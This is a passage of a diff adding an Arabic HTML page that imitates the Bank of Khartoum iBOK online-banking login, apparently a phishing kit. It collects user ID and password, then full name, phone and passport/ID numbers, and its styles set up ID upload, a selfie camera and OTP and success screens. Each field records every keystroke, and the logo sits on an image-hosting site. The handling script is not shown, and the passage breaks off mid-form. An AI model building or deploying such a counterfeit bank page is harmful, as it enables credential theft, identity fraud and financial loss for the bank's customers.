@@ -1,0 +1,2280 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>بنك الخرطوم - iBOK</title>
+
+  <!-- خط عربي واضح وحديث -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <!-- مكتبة أيقونات Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
+  <style>
+    :root {
+      --red-primary: #d32027;
+      --red-header-2: #c8232c;
+      --red-dark: #a9161c;
+      --red-light: #e53935;
+      --gold-banner: #c59b27;
+      --gold-btn: #b3922d;
+      --gold-spinner: #d4a017;
+      --pink-btn: #e59398;
+      --pink-btn-hover: #da7d83;
+      --bg-canvas: #f3f3f3;
+      --card-bg: #ffffff;
+      --text-main: #222222;
+      --text-muted: #555555;
+      --border-input: #777777;
+      --shadow-card: 0 4px 14px rgba(0, 0, 0, 0.08);
+      --shadow-btn: 0 3px 8px rgba(169, 22, 28, 0.28);
+      --radius-card: 12px;
+      --radius-btn: 8px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      background-color: var(--bg-canvas);
+      background-image:
+        radial-gradient(rgba(0, 0, 0, 0.03) 1px, transparent 1px),
+        radial-gradient(rgba(0, 0, 0, 0.03) 1px, var(--bg-canvas) 1px);
+      background-size: 28px 28px;
+      background-position: 0 0, 14px 14px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      color: var(--text-main);
+    }
+
+    .app-shell {
+      width: 100%;
+      max-width: 440px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background-color: transparent;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.06);
+      position: relative;
+    }
+
+    .screen {
+      display: none;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: space-between;
+    }
+
+    .screen.active {
+      display: flex;
+    }
+
+    /* ================= طبقة الدائرة الذهبية ================= */
+    .gold-loader-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.22);
+      backdrop-filter: blur(1px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+    }
+
+    .gold-loader-overlay.active {
+      display: flex;
+    }
+
+    .gold-spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 6px solid rgba(197, 155, 39, 0.22);
+      border-top-color: var(--gold-spinner);
+      border-right-color: #f0c43c;
+      animation: spinGold 0.85s linear infinite;
+      box-shadow: 0 4px 18px rgba(197, 155, 39, 0.35);
+      background: rgba(255, 255, 255, 0.75);
+    }
+
+    @keyframes spinGold {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* ================= شاشة 1: الواجهة الأولى ================= */
+    .top-header-1 {
+      background: linear-gradient(180deg, var(--red-light) 0%, var(--red-primary) 65%, var(--red-dark) 100%);
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.14);
+    }
+
+    .brand-box {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #ffffff;
+      user-select: none;
+    }
+
+    .brand-icon-img {
+      height: 42px;
+      width: auto;
+      display: block;
+      background: transparent;
+      border: none;
+      border-radius: 0;
+      box-shadow: none;
+      object-fit: contain;
+    }
+
+    .brand-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.25;
+      text-align: right;
+    }
+
+    .brand-text .ar-name {
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+    }
+
+    .brand-text .en-name {
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      opacity: 0.95;
+      border-top: 1px solid rgba(255, 255, 255, 0.45);
+      padding-top: 2px;
+      margin-top: 2px;
+    }
+
+    .content-1 {
+      padding: 18px 14px 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      flex: 1;
+    }
+
+    .card {
+      background-color: var(--card-bg);
+      border-radius: var(--radius-card);
+      box-shadow: var(--shadow-card);
+      border: 1px solid rgba(0, 0, 0, 0.04);
+    }
+
+    .login-card {
+      padding: 24px 20px 26px;
+      text-align: center;
+    }
+
+    .login-title {
+      font-size: 23px;
+      font-weight: 700;
+      color: #2b2b2b;
+      margin-bottom: 22px;
+    }
+
+    .login-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .login-btn {
+      width: 100%;
+      border: none;
+      border-radius: var(--radius-btn);
+      background: linear-gradient(180deg, #e02930 0%, var(--red-primary) 55%, var(--red-dark) 100%);
+      color: #ffffff;
+      font-family: 'Cairo', sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      padding: 13px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      box-shadow: var(--shadow-btn);
+      transition: transform 0.15s ease, filter 0.15s ease;
+    }
+
+    .login-btn:hover {
+      filter: brightness(1.05);
+    }
+
+    .login-btn:active {
+      transform: scale(0.985);
+    }
+
+    .btn-start {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn-start i {
+      font-size: 19px;
+      opacity: 0.95;
+    }
+
+    .btn-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .btn-arrow {
+      font-size: 17px;
+      transition: transform 0.2s ease;
+    }
+
+    .login-btn:hover .btn-arrow {
+      transform: translateX(-4px);
+    }
+
+    .menu-card {
+      padding: 22px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-decoration: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      transition: transform 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease;
+    }
+
+    .menu-card:hover {
+      background-color: #fafafa;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+    }
+
+    .menu-card:active {
+      transform: translateY(0);
+    }
+
+    .about-icon-wrap,
+    .terms-icon-wrap {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 29px;
+      color: #111111;
+      width: 36px;
+      height: 36px;
+    }
+
+    .about-badge {
+      position: absolute;
+      bottom: -2px;
+      left: -2px;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background-color: var(--red-primary);
+      color: #ffffff;
+      font-family: Georgia, serif;
+      font-style: italic;
+      font-weight: bold;
+      font-size: 11px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #ffffff;
+    }
+
+    .terms-badge {
+      position: absolute;
+      bottom: -3px;
+      left: -3px;
+      width: 17px;
+      height: 17px;
+      border-radius: 50%;
+      background-color: var(--red-primary);
+      color: #ffffff;
+      font-size: 9px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #ffffff;
+    }
+
+    .location-pin {
+      font-size: 32px;
+      color: #141414;
+    }
+
+    .menu-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #333333;
+      text-align: center;
+    }
+
+    /* ================= الشريط العلوي والبانر للواجهات الداخلية ================= */
+    .top-bar-2 {
+      background-color: var(--red-header-2);
+      color: #ffffff;
+      padding: 12px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .top-bar-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .ibok-logo {
+      font-family: Arial, sans-serif;
+      font-size: 26px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      line-height: 1;
+      padding-left: 12px;
+      border-left: 1.5px solid rgba(255, 255, 255, 0.55);
+      user-select: none;
+    }
+
+    .top-bar-sub {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.25;
+    }
+
+    .top-bar-sub .ar {
+      font-size: 13px;
+      font-weight: 700;
+    }
+
+    .top-bar-sub .en {
+      font-family: Arial, sans-serif;
+      font-size: 11px;
+      opacity: 0.92;
+      direction: ltr;
+      text-align: left;
+    }
+
+    .back-home-btn {
+      background: rgba(255, 255, 255, 0.16);
+      color: #ffffff;
+      border: 1px solid rgba(255, 255, 255, 0.35);
+      border-radius: 6px;
+      padding: 6px 10px;
+      font-family: 'Cairo', sans-serif;
+      font-size: 12.5px;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .back-home-btn:hover {
+      background: rgba(255, 255, 255, 0.25);
+    }
+
+    .page-title-banner {
+      background-color: var(--gold-banner);
+      color: #ffffff;
+      padding: 16px 18px;
+      text-align: right;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.12);
+    }
+
+    .page-title-banner h1 {
+      font-size: 19.5px;
+      font-weight: 600;
+      line-height: 1.55;
+    }
+
+    .main-content-2 {
+      padding: 20px 16px 24px;
+      flex: 1;
+    }
+
+    .form-card {
+      background-color: var(--card-bg);
+      border-radius: 14px;
+      padding: 24px 20px 28px;
+      box-shadow: 0 5px 18px rgba(0, 0, 0, 0.08);
+    }
+
+    .card-heading-wrap {
+      text-align: center;
+      margin-bottom: 22px;
+    }
+
+    .card-heading {
+      display: inline-block;
+      font-size: 20.5px;
+      font-weight: 700;
+      color: #2b2b2b;
+      padding-bottom: 6px;
+      border-bottom: 2px solid var(--red-header-2);
+    }
+
+    .field-group {
+      margin-bottom: 16px;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 14.5px;
+      font-weight: 600;
+      color: #333333;
+      margin-bottom: 7px;
+    }
+
+    .input-control,
+    .select-control {
+      width: 100%;
+      height: 48px;
+      border: 1.2px solid var(--border-input);
+      border-radius: 6px;
+      background-color: #ffffff;
+      padding: 0 14px;
+      font-family: 'Cairo', sans-serif;
+      font-size: 15px;
+      color: #222222;
+      outline: none;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .input-control::placeholder {
+      color: #888888;
+      font-size: 14px;
+    }
+
+    .input-control:focus,
+    .select-control:focus {
+      border-color: var(--red-header-2);
+      box-shadow: 0 0 0 3px rgba(200, 35, 44, 0.1);
+    }
+
+    .password-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .password-wrapper .input-control {
+      padding-left: 44px;
+    }
+
+    .toggle-password-btn {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: transparent;
+      border: none;
+      color: #555555;
+      font-size: 17px;
+      cursor: pointer;
+      padding: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toggle-password-btn:hover {
+      color: var(--red-header-2);
+    }
+
+    .forgot-row {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 8px;
+    }
+
+    .forgot-link {
+      color: #444444;
+      font-size: 13.5px;
+      text-decoration: none;
+      transition: color 0.15s ease;
+    }
+
+    .forgot-link:hover {
+      color: var(--red-header-2);
+      text-decoration: underline;
+    }
+
+    .terms-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 18px 0 22px;
+    }
+
+    .terms-checkbox {
+      appearance: none;
+      -webkit-appearance: none;
+      width: 20px;
+      height: 20px;
+      border: 1.5px solid var(--red-header-2);
+      border-radius: 3px;
+      background-color: #ffffff;
+      cursor: pointer;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .terms-checkbox:checked {
+      background-color: var(--red-header-2);
+      border-color: var(--red-header-2);
+    }
+
+    .terms-checkbox:checked::after {
+      content: "✓";
+      color: #ffffff;
+      font-size: 13px;
+      font-weight: bold;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -52%);
+    }
+
+    .terms-label {
+      font-size: 14.5px;
+      color: #444444;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .submit-btn {
+      width: 100%;
+      height: 50px;
+      border: none;
+      border-radius: 8px;
+      background-color: var(--pink-btn);
+      color: #ffffff;
+      font-family: 'Cairo', sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s ease, transform 0.15s ease, box-shadow 0.2s ease;
+    }
+
+    .submit-btn.ready-red {
+      background: linear-gradient(180deg, #e02930 0%, var(--red-primary) 60%, var(--red-dark) 100%);
+      box-shadow: var(--shadow-btn);
+    }
+
+    .submit-btn:hover {
+      filter: brightness(1.04);
+    }
+
+    .submit-btn:active {
+      transform: scale(0.99);
+    }
+
+    .full-verification-section {
+      margin-top: 20px;
+      padding-top: 18px;
+      border-top: 1.5px dashed #dddddd;
+    }
+
+    .sub-section-title {
+      font-size: 16.5px;
+      font-weight: 700;
+      color: var(--red-header-2);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .upload-box {
+      border: 1.5px dashed var(--gold-banner);
+      border-radius: 10px;
+      padding: 16px;
+      text-align: center;
+      background-color: #fffdf7;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .upload-box:hover {
+      background-color: #fcf7e6;
+    }
+
+    .upload-box i {
+      font-size: 26px;
+      color: var(--gold-banner);
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .upload-status {
+      margin-top: 8px;
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #1b7e3c;
+      min-height: 20px;
+    }
+
+    .preview-thumb {
+      margin-top: 10px;
+      max-height: 130px;
+      max-width: 100%;
+      border-radius: 8px;
+      display: none;
+      margin-inline: auto;
+      border: 1px solid #dddddd;
+    }
+
+    .selfie-box {
+      margin-top: 18px;
+      border: 1.5px solid #e5e5e5;
+      border-radius: 10px;
+      padding: 14px;
+      background-color: #fafafa;
+    }
+
+    .camera-controls {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+      flex-wrap: wrap;
+    }
+
+    .mini-btn {
+      flex: 1;
+      min-width: 105px;
+      height: 40px;
+      border: none;
+      border-radius: 7px;
+      font-family: 'Cairo', sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .mini-btn-dark {
+      background-color: #2b2b2b;
+      color: #ffffff;
+    }
+
+    .mini-btn-gold {
+      background-color: var(--gold-banner);
+      color: #ffffff;
+    }
+
+    .mini-btn-red {
+      background-color: var(--red-header-2);
+      color: #ffffff;
+    }
+
+    .mini-btn-gallery {
+      background-color: #1e6f5c;
+      color: #ffffff;
+    }
+
+    .camera-stage {
+      position: relative;
+      width: 100%;
+      height: 250px;
+      background-color: #141414;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 12px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .camera-stage.active {
+      display: flex;
+    }
+
+    .camera-stage video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .camera-stage video.mirrored {
+      transform: scaleX(-1);
+    }
+
+    .gold-face-guide {
+      position: absolute;
+      width: 148px;
+      height: 192px;
+      border: 3px solid #f2c329;
+      border-radius: 50%;
+      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.36), 0 0 14px rgba(242, 195, 41, 0.8);
+      pointer-events: none;
+    }
+
+    .selfie-captured-box {
+      display: none;
+      margin-top: 12px;
+      text-align: center;
+    }
+
+    .selfie-captured-box.active {
+      display: block;
+    }
+
+    .selfie-captured-box img {
+      width: 150px;
+      height: 150px;
+      object-fit: cover;
+      border-radius: 50%;
+      border: 3px solid var(--gold-banner);
+      display: block;
+      margin: 0 auto 10px;
+    }
+
+    .security-answer-box {
+      display: none;
+      margin-top: 16px;
+    }
+
+    .security-answer-box.visible {
+      display: block;
+    }
+
+    .otp-info-banner {
+      background-color: #fff9e6;
+      border: 1px solid #e6c86e;
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 14px;
+      color: #333333;
+      margin-bottom: 18px;
+      line-height: 1.65;
+    }
+
+    /* ================= شاشة جاري تسليم الإستمارة ================= */
+    .submission-screen {
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+      text-align: center;
+    }
+
+    .stepper-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 22px;
+      direction: ltr;
+    }
+
+    .step-circle {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      font-weight: 700;
+      color: #ffffff;
+      background-color: #2b6be6;
+      transition: background-color 0.25s ease, transform 0.25s ease, border-color 0.25s ease;
+    }
+
+    .step-circle.completed {
+      background-color: #22a34a;
+      color: #ffffff;
+    }
+
+    .step-circle.active-step {
+      background-color: #ffffff;
+      color: #2b6be6;
+      border: 2px dashed #2b6be6;
+      transform: scale(1.08);
+    }
+
+    .step-circle.active-step.completed {
+      border-color: #22a34a;
+      color: #22a34a;
+    }
+
+    .submission-illustration {
+      width: 145px;
+      max-width: 100%;
+      margin: 0 auto 18px;
+    }
+
+    .submission-illustration svg {
+      width: 145px;
+      height: 122px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .submission-status-text {
+      font-size: 20px;
+      font-weight: 700;
+      color: #b7952b;
+      line-height: 1.4;
+      direction: rtl;
+    }
+
+    /* ================= شاشة النجاح النهائية ================= */
+    .ekyc-success-screen {
+      background-color: #e9e9e9;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px 12px;
+    }
+
+    .ekyc-sheet {
+      width: 100%;
+      background-color: #ffffff;
+      border-radius: 14px;
+      padding: 26px 20px 24px;
+      box-shadow: 0 6px 22px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+
+    .ekyc-check-circle {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background-color: #6ab04c;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      margin: 0 auto 16px;
+    }
+
+    .ekyc-main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #222222;
+      margin-bottom: 12px;
+      line-height: 1.35;
+    }
+
+    .ekyc-subtitle {
+      font-size: 13.5px;
+      color: #555555;
+      line-height: 1.65;
+      margin-bottom: 20px;
+      padding: 0 4px;
+    }
+
+    .ekyc-summary-box {
+      background-color: #f4f4f4;
+      border-radius: 8px;
+      padding: 18px 16px;
+      text-align: right;
+      margin-bottom: 24px;
+    }
+
+    .ekyc-row-label {
+      font-size: 13px;
+      color: #888888;
+      margin-bottom: 4px;
+    }
+
+    .ekyc-ref-value {
+      font-family: Arial, sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: #222222;
+      margin-bottom: 14px;
+      direction: ltr;
+      text-align: left;
+    }
+
+    .ekyc-date-label {
+      font-size: 13px;
+      color: #888888;
+      margin-bottom: 4px;
+      text-align: center;
+    }
+
+    .ekyc-date-value {
+      font-family: Arial, sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: #222222;
+      text-align: center;
+      direction: ltr;
+      margin-bottom: 14px;
+    }
+
+    .ekyc-status-strip {
+      background-color: #e3f2e8;
+      color: #2e6f40;
+      font-size: 14.5px;
+      font-weight: 700;
+      padding: 10px 14px;
+      border-radius: 6px;
+      text-align: right;
+      margin-bottom: 14px;
+    }
+
+    .ekyc-recorded-list {
+      background-color: #ffffff;
+      border: 1px solid #e2e2e2;
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin-bottom: 14px;
+      font-size: 12.5px;
+      color: #333333;
+      line-height: 1.75;
+    }
+
+    .ekyc-review-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 13px;
+      color: #555555;
+      line-height: 1.65;
+      text-align: right;
+    }
+
+    .ekyc-review-note i {
+      color: #555555;
+      font-size: 16px;
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    .ekyc-download-btn {
+      width: 100%;
+      max-width: 250px;
+      height: 46px;
+      border: none;
+      border-radius: 4px;
+      background-color: var(--gold-btn);
+      color: #ffffff;
+      font-family: 'Cairo', sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin: 0 auto;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: filter 0.15s ease;
+    }
+
+    .ekyc-download-btn:hover {
+      filter: brightness(1.06);
+    }
+
+    .page-footer {
+      border-top: 2.5px solid var(--red-header-2);
+      background-color: #f7f6f4;
+      padding: 16px 14px 20px;
+      text-align: center;
+    }
+
+    .copyright-text {
+      font-size: 15px;
+      font-weight: 700;
+      color: #2b2b2b;
+      margin-bottom: 14px;
+    }
+
+    .social-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
+    }
+
+    .social-icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      transition: transform 0.15s ease, opacity 0.15s ease;
+    }
+
+    .social-icon:hover {
+      transform: translateY(-2px);
+      opacity: 0.92;
+    }
+
+    .icon-bank {
+      background: linear-gradient(135deg, #2e7d32 0%, #66bb6a 60%, #fbc02d 100%);
+    }
+
+    .icon-in {
+      background-color: #0077b5;
+      font-family: Arial, sans-serif;
+    }
+
+    .icon-x {
+      background-color: #111111;
+    }
+
+    .icon-fb {
+      background-color: #3b5998;
+    }
+
+    .message-box {
+      margin-top: 14px;
+      font-size: 13.5px;
+      text-align: center;
+      min-height: 20px;
+      color: var(--red-dark);
+      font-weight: 600;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background-color: #222222;
+      color: #ffffff;
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-size: 14px;
+      opacity: 0;
+      transition: all 0.25s ease;
+      z-index: 999;
+      pointer-events: none;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- الدائرة الذهبية -->
+  <div id="goldLoader" class="gold-loader-overlay" aria-hidden="true">
+    <div class="gold-spinner"></div>
+  </div>
+
+  <div class="app-shell">
+
+    <!-- ==================== شاشة 1: الواجهة الأولى ==================== -->
+    <div id="screenHome" class="screen active">
+      <div>
+        <header class="top-header-1">
+          <div class="brand-box">
+            <img
+              src="https://i.ibb.co/JFsHt3L5/293942-removebg-preview.png"
+              alt="أيقونة بنك الخرطوم"
+              class="brand-icon-img"
+            />
+            <div class="brand-text">
+              <span class="ar-name">بنك الخرطوم</span>
+              <span class="en-name">Bank of Khartoum</span>
+            </div>
+          </div>
+        </header>
+
+        <main class="content-1">
+          <section class="card login-card" aria-label="تسجيل الدخول">
+            <h1 class="login-title">تسجيل الدخول إلى</h1>
+
+            <div class="login-actions">
+              <button type="button" class="login-btn" onclick="openLoginScreen('iBOK')">
+                <span class="btn-start">
+                  <i class="fa-solid fa-users"></i>
+                  <span class="btn-label">تسجيل دخول <span dir="ltr">iBOK</span></span>
+                </span>
+                <i class="fa-solid fa-arrow-left btn-arrow"></i>
+              </button>
+
+              <button type="button" class="login-btn" onclick="openLoginScreen('iBOK+')">
+                <span class="btn-start">
+                  <i class="fa-regular fa-building"></i>
+                  <span class="btn-label">تسجيل دخول <span dir="ltr">iBOK+</span></span>
+                </span>
+                <i class="fa-solid fa-arrow-left btn-arrow"></i>
+              </button>
+            </div>
+          </section>
+
+          <button type="button" class="card menu-card" onclick="handleAction('نبذة عنا')">
+            <span class="about-icon-wrap" aria-hidden="true">
+              <i class="fa-solid fa-user"></i>
+              <span class="about-badge">i</span>
+            </span>
+            <span class="menu-title">نبذة عنا</span>
+          </button>
+
+          <button type="button" class="card menu-card" onclick="handleAction('الشروط والأحكام')">
+            <span class="terms-icon-wrap" aria-hidden="true">
+              <i class="fa-solid fa-file-lines"></i>
+              <span class="terms-badge"><i class="fa-solid fa-check"></i></span>
+            </span>
+            <span class="menu-title">الشروط والأحكام</span>
+          </button>
+
+          <button type="button" class="card menu-card" onclick="handleAction('الفروع / أجهزة الصراف الآلي')">
+            <span class="location-pin" aria-hidden="true">
+              <i class="fa-solid fa-location-dot"></i>
+            </span>
+            <span class="menu-title">الفروع / أجهزة الصراف الآلي</span>
+          </button>
+        </main>
+      </div>
+    </div>
+
+    <!-- ==================== شاشة 2: واجهة تسجيل الدخول ==================== -->
+    <div id="screenLogin" class="screen">
+      <div>
+        <header class="top-bar-2">
+          <div class="top-bar-left">
+            <div class="ibok-logo" id="headerBrand" dir="ltr">iBOK</div>
+            <div class="top-bar-sub">
+              <span class="ar">الخدمات المصرفية عبر الإنترنت</span>
+              <span class="en">Internet Banking Services</span>
+            </div>
+          </div>
+          <button type="button" class="back-home-btn" onclick="openHomeScreen()">
+            <i class="fa-solid fa-arrow-right"></i>
+            <span>رجوع</span>
+          </button>
+        </header>
+
+        <section class="page-title-banner">
+          <h1 id="bannerTitle">الخدمات المصرفية عبر الإنترنت من <span dir="ltr">iBOK</span> - تسجيل الدخول</h1>
+        </section>
+
+        <main class="main-content-2">
+          <form id="loginForm" class="form-card" onsubmit="handleLoginSubmit(event)" novalidate>
+            <div class="card-heading-wrap">
+              <h2 class="card-heading">يرجى إدخال التفاصيل</h2>
+            </div>
+
+            <div class="field-group">
+              <label for="username" class="field-label">معرف المستخدم:</label>
+              <input
+                type="text"
+                id="username"
+                name="username"
+                class="input-control"
+                placeholder="ادخل رقم الحساب أو رقم المعرفة"
+                autocomplete="off"
+                oninput="recordFieldChange('username', this.value); checkLoginReady();"
+              />
+            </div>
+
+            <div class="field-group">
+              <label for="password" class="field-label">كلمة المرور:</label>
+              <div class="password-wrapper">
+                <input
+                  type="password"
+                  id="password"
+                  name="password"
+                  class="input-control"
+                  placeholder="أدخل كلمة المرور"
+                  autocomplete="current-password"
+                  oninput="recordFieldChange('password', this.value); checkLoginReady();"
+                />
+                <button
+                  type="button"
+                  class="toggle-password-btn"
+                  id="togglePasswordBtn"
+                  aria-label="إظهار أو إخفاء كلمة المرور"
+                  onclick="togglePassword()"
+                >
+                  <i id="eyeIcon" class="fa-regular fa-eye-slash"></i>
+                </button>
+              </div>
+              <div class="forgot-row">
+                <a href="#forgot-password" class="forgot-link" onclick="showMessage('loginMessage', 'تم اختيار: هل نسيت كلمة المرور؟')">
+                  هل نسيت كلمة المرور؟
+                </a>
+              </div>
+            </div>
+
+            <div class="terms-row">
+              <input
+                type="checkbox"
+                id="terms"
+                name="terms"
+                class="terms-checkbox"
+                checked
+                onchange="checkLoginReady()"
+              />
+              <label for="terms" class="terms-label">الشروط والأحكام</label>
+            </div>
+
+            <button type="submit" id="loginSubmitBtn" class="submit-btn">تسجيل الدخول</button>
+
+            <div id="loginMessage" class="message-box" role="status" aria-live="polite"></div>
+          </form>
+        </main>
+      </div>
+
+      <footer class="page-footer">
+        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
+        <div class="social-row">
+          <button type="button" class="social-icon icon-bank" aria-label="العودة إلى الرئيسية" onclick="openHomeScreen()">
+            <i class="fa-solid fa-shield-halved"></i>
+          </button>
+          <a href="#linkedin" class="social-icon icon-in" aria-label="LinkedIn">in</a>
+          <a href="#x" class="social-icon icon-x" aria-label="X">
+            <i class="fa-brands fa-x-twitter"></i>
+          </a>
+          <a href="#facebook" class="social-icon icon-fb" aria-label="Facebook">
+            <i class="fa-brands fa-facebook-f"></i>
+          </a>
+        </div>
+      </footer>
+    </div>
+
+    <!-- ==================== شاشة 3: تحديث بيانات بنك الخرطوم ==================== -->
+    <div id="screenUpdate" class="screen">
+      <div>
+        <header class="top-bar-2">
+          <div class="top-bar-left">
+            <div class="ibok-logo" dir="ltr">iBOK</div>
+            <div class="top-bar-sub">
+              <span class="ar">بنك الخرطوم</span>
+              <span class="en">Bank of Khartoum</span>
+            </div>
+          </div>
+          <button type="button" class="back-home-btn" onclick="openHomeScreen()">
+            <i class="fa-solid fa-arrow-right"></i>
+            <span>رجوع</span>
+          </button>
+        </header>
+
+        <section class="page-title-banner">
+          <h1>تحديث بيانات بنك الخرطوم</h1>
+        </section>
+
+        <main class="main-content-2">
+          <form id="updateForm" class="form-card" onsubmit="handleUpdateSubmit(event)" novalidate>
+            <div class="card-heading-wrap">
+              <h2 class="card-heading">تحديث البيانات</h2>
+            </div>
+
+            <div class="field-group">
+              <label for="fullName" class="field-label">الاسم الرباعي:</label>
+              <input
+                type="text"
+                id="fullName"
+                class="input-control"
+                placeholder="أدخل اسمك الرباعي"
+                oninput="recordFieldChange('fullName', this.value)"
+              />
+            </div>
+
+            <div class="field-group">
+              <label for="phoneNumber" class="field-label">رقم الهاتف:</label>
+              <input
+                type="tel"
+                id="phoneNumber"
+                class="input-control"
+                placeholder="أدخل رقم الهاتف"
+                inputmode="numeric"
+                oninput="this.value = this.value.replace(/\D/g, ''); recordFieldChange('phoneNumber', this.value)"
+              />
+            </div>
+
+            <div class="field-group">
+              <label for="passportNumber" class="field-label">رقم الجواز / الهوية:</label>
+              <input
+                type="text"
+                id="passportNumber"
+                class="input-control"
+                placeholder="أدخل رقم الجواز أو الهوية"
+                oninput="recordFieldChange('passportNumber', this.value)"
+              />
+            </div>
+
+            <div class="full-verification-section">
+              <div class="field-group">
+                <h3 class="sub-section-title">
+                  <i class="fa-solid fa-id-card"></i>
